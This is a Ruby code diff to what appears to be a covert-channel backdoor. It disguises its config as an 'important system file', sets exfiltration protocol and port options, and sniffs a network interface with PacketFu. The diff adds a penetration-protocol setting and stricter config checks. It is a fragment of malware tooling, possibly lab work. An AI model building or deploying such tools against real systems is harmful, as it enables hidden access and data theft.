@@ -35,6 +35,7 @@ $KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest
 ## Application Strings
 CONFIG_FILE = "not_important"
 CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
+CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# exfil_port = 6868\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
@@ -80,9 +81,13 @@ def validate_config
       end
 
       case pair[0]
+      when "pen_prot"
+        if valid_protocol(pair[1])
+          @cfg_pen_protocol = pair[1]
+        end
       when "exfil_prot"
         if valid_protocol(pair[1])
-          @cfg_protocol = pair[1]
+          @cfg_exfil_protocol = pair[1]
         end
       when "exfil_port"
         if valid_port(pair[1].to_i)
@@ -94,7 +99,9 @@ def validate_config
       end
     end
   end
-  if @cfg_port == nil
+  #check if all items are present
+  if @cfg_pen_protocol == nil || @cfg_exfil_protocol == nil \
+    || @cfg_iface == nil || @cfg_port == nil
     exit_reason(CONFIG_INVALID)
   end
 end
@@ -127,7 +134,7 @@ end
 
 def start_listen_server
   puts "server listening"
-  filter = "#{@cfg_protocol}"
+  filter = "#{@cfg_pen_protocol}"
   begin
     cap = PacketFu::Capture.new(:iface => @cfg_iface,
       :start => true,
